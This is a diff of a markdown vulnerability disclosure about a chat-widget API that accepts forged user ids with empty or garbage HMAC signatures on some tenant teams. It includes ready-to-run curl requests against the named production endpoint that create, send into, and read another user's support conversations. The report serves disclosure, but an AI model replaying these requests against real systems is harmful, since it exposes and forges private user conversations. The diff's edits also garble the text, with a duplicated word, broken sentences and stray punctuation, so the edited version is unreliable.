@@ -1,4 +1,4 @@
-# DecaForge: Decagon chat-widget HMAC signature unenforced on 29 of 94 tenant teams — read and write any user's support history
+# DecaForge: Decagon chat-widget HMAC signature unenforced on 29 of 94 tenant teams: read and write any user's support history
 
 Class: improper verification of cryptographic signature (CWE-347) · Severity
 High, CVSS 8.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` · Tested
@@ -14,7 +14,7 @@ signature is not enforced: the API accepts any user id with the signature
 empty, garbage, or absent, and serves that id's conversation list and full
 message history. The backend already evaluates the signature and reports the
 result in-band (`_decagon_has_valid_signature: false` in the response body)
-— the omission is visible on every affected response. The same request
+The omission is visible on every affected response. The same request
 returns 401 on enforcing teams: Notion (team 31), Coinbase (63), Strava
 (128). This is a per-tenant configuration gap across the fleet, not one
 global hole.
@@ -29,7 +29,7 @@ support history, and open threads attributed to them.
 Every request carries:
 
 ```text
-X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a
+X-DECAGON-AUTH-USER-ID: qe2e-canary-a
 X-DECAGON-AUTH-TEAM-ID: 29
 X-DECAGON-AUTH-SIGNATURE: (empty)
 X-DECAGON-AUTH-EPOCH: (empty)
@@ -38,7 +38,7 @@ X-DECAGON-AUTH-EPOCH: (empty)
 1. Create a conversation:
 
 ```bash
-curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
+curl -s -H "X-DECAGON-AUTH-USER-ID: qe2e-canary-a" \
     -H "X-DECAGON-AUTH-TEAM-ID: 29" -H "X-DECAGON-AUTH-SIGNATURE: " -H "X-DECAGON-AUTH-EPOCH: " \
     -H "Content-Type: application/json" \
     -d '{"flow_id":"replit","metadata":{"widget_location":"https://decagon.ai/"}}' \
@@ -49,7 +49,7 @@ curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
 2. Send a message into it:
 
 ```bash
-curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
+curl -s -H "X-DECAGON-AUTH-USER-ID: qe2e-canary-a" \
     -H "X-DECAGON-AUTH-TEAM-ID: 29" -H "X-DECAGON-AUTH-SIGNATURE: " -H "X-DECAGON-AUTH-EPOCH: " \
     -H "Content-Type: application/json" \
     -d '{"type":"chat_message","text":"canary message for e2e proof","flow_id":"replit"}' \
@@ -60,17 +60,17 @@ curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
 3. Read the list back with the same empty signature:
 
 ```bash
-curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
+curl -s -H "X-DECAGON-AUTH-USER-ID: qe2e-canary-a" \
     -H "X-DECAGON-AUTH-TEAM-ID: 29" -H "X-DECAGON-AUTH-SIGNATURE: " \
     https://api.decagon.ai/conversation/user
 # {"conversations":[{"id":"c71b62e4-…","text":"canary message for e2e proof",…}]}
 ```
 
-4. Read the history with a garbage signature — 64 hex characters that are an
+4. Read the history with a garbage signature. 64 hex characters that are an
 HMAC of nothing:
 
 ```bash
-curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
+curl -s -H "X-DECAGON-AUTH-USER-ID: qe2e-canary-a" \
     -H "X-DECAGON-AUTH-TEAM-ID: 29" \
     -H "X-DECAGON-AUTH-SIGNATURE: deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef" \
     -H "X-DECAGON-AUTH-EPOCH: 1" \
@@ -87,10 +87,10 @@ Omitting the signature header entirely also returns the history.
 
 ## Scope controls that DO hold
 
-A second canary id (`bastion-e2e-canary-b`) gets an empty list at step 3 and
+A second canary id (`qe2e-canary-b`) gets an empty list at step 3 and
 `{"detail":"Conversation not found"}` at step 4 against the same conversation
 id; sending into that conversation as B also 404s and the message does not
-land. The forged id is the credential — there is no cross-id object access.
+land. The forged id is the credential. There is no cross-id object access.
 
 ## Affected teams
 
@@ -102,15 +102,15 @@ on these teams out of 130 swept (94 live):
 ```
 
 Team 29 was identified as the replit deployment by offering candidate flow
-ids to `conversation/new` — only `replit` was accepted there and rejected on
+ids to `conversation/new`. Only `replit` was accepted there and rejected on
 every other team, so flow ids are team-scoped and the match is exact. An
 independent verifier re-ran the whole chain with fresh ids and matched every
 step, including the omitted-signature read.
 
 ## Re-verification (2026-08-22, post-report)
 
-- The named victims from the original repro — Notion (31), Coinbase (63),
-  Strava (128) — now ENFORCE: `{"detail":"Invalid signature."}` HTTP 401
+- The named victims from the original repro. Notion (31), Coinbase (63),
+  Strava (128). now ENFORCE: `{"detail":"Invalid signature."}` HTTP 401
   with empty and garbage signatures. Remediated between the original repro
   and the re-check.
 - 12 of 31 sampled live teams STILL accept a named forged user id with an
@@ -126,14 +126,14 @@ Anyone who knows or guesses a user id on an affected team reads that id's
 support conversation list and full message history, and can open new threads
 and send messages attributed to that id. The user id is the identifier the
 customer's site passes to the widget, so its guessability is set by each
-customer's integration — for many widgets it is a sequential or
+customer's integration. for many widgets it is a sequential or
 email-derived value.
 
 ## Fix
 
 Reject named ids whose signature is absent or invalid, on all teams. The
-check already runs and the result is already computed on every request —
-gate the read and write paths on `_decagon_has_valid_signature` instead of
+The check already runs and the result is already computed on every request.
+Gate the read and write paths on `_decagon_has_valid_signature` instead of
 recording it in the response body. The flag and the git sha in the response
 metadata are themselves worth removing.
 
